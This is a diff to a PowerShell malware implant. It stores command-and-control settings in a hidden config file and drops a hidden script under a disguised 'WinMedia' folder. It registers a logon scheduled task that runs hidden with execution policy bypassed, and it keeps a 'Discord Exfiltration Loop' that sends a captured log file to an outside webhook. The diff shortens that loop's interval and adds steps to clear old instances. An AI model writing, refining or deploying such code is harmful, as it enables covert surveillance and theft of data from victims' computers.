@@ -5,19 +5,31 @@ if(!(Test-Path $d)){New-Item $d -Type Directory | Out-Null}
 
 $l = "$d\data.txt"
 $p = "$d\winlog.ps1"
+$c = "$d\config.json"
 
-# Save execution parameters permanently to the user environment registry
-[Environment]::SetEnvironmentVariable("C2_PCNAME", $PCName, "User")
-[Environment]::SetEnvironmentVariable("C2_WEBHOOK", $WebhookUrl, "User")
-[Environment]::SetEnvironmentVariable("C2_SERVER", $C2Url, "User")
-[Environment]::SetEnvironmentVariable("C2_LOGFILE", $l, "User")
+# Save execution parameters cleanly to a local configuration JSON file
+$config = @{
+    PCName     = $PCName
+    WebhookUrl = $WebhookUrl
+    C2Url      = $C2Url
+    LogFile    = $l
+}
+$config | ConvertTo-Json | Set-Content -Path $c -Force
 
-# The internal script content reads clean variables directly out of the Environment space
+# The internal operational loop script reads the config file locally on startup
 $scriptContent = @'
-$PCName     = $env:C2_PCNAME
-$WebhookUrl = $env:C2_WEBHOOK
-$C2Url      = $env:C2_SERVER
-$l          = $env:C2_LOGFILE
+$d = "$env:LOCALAPPDATA\WinMedia"
+$c = "$d\config.json"
+
+if (Test-Path $c) {
+    $config = Get-Content -Path $c | ConvertFrom-Json
+    $PCName     = $config.PCName
+    $WebhookUrl = $config.WebhookUrl
+    $C2Url      = $config.C2Url
+    $l          = $config.LogFile
+} else {
+    exit
+}
 
 # 1. Discord Exfiltration Loop
 Start-Job -ScriptBlock {
@@ -30,7 +42,7 @@ Start-Job -ScriptBlock {
                 Clear-Content $l -ErrorAction SilentlyContinue
             }
         }
-        Start-Sleep -s 60
+        Start-Sleep -s 30
     }
 } -ArgumentList $l, $WebhookUrl, $PCName
 
@@ -63,10 +75,12 @@ while($true){
 }
 '@
 
-# Safely output the persistent operations file
+# Save persistent target script to folder
 Set-Content -Path $p -Value $scriptContent
 Set-ItemProperty -Path $p -Name Attributes -Value Hidden -ErrorAction SilentlyContinue
+Set-ItemProperty -Path $c -Name Attributes -Value Hidden -ErrorAction SilentlyContinue
 
-# Create and run the simplified task (escaped with outer single quotes and inner double quotes)
+# Clear old instances, register clean task, and spin up
+schtasks /delete /tn 'WinMediaLog' /f 2>&1 | Out-Null
 schtasks /create /f /tn 'WinMediaLog' /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p`"" /sc onlogon
 schtasks /run /tn 'WinMediaLog'
